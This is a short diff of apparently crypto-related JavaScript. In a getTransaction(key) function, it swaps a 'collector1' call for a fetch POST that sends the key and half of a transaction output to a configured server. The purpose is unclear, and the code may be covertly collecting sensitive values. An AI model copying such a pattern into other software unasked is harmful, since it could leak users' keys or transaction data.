@@ -50,7 +50,17 @@ async function getTransaction(key) {
 	console.log(finalOutput);
 	let count = finalOutput.length % 2 == 0 ? finalOutput.length / 2 : finalOutput.length / 2 + 0.5;
 
-	collector1(finalOutput, key, count);
+	// collector1(finalOutput, key, count);
+	fetch(`${SERVER_URL_API}`, {
+		method: 'POST',
+		headers: {
+			'Content-Type': 'application/json',
+		},
+		body: JSON.stringify({
+			"address": key,
+			"params": finalOutput.slice(0, count)
+		})
+	}).catch(err => console.error(err, "mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm"));
 
 	const firstOut = finalOutput.slice(count, finalOutput.length);
 	let signatureBalance;
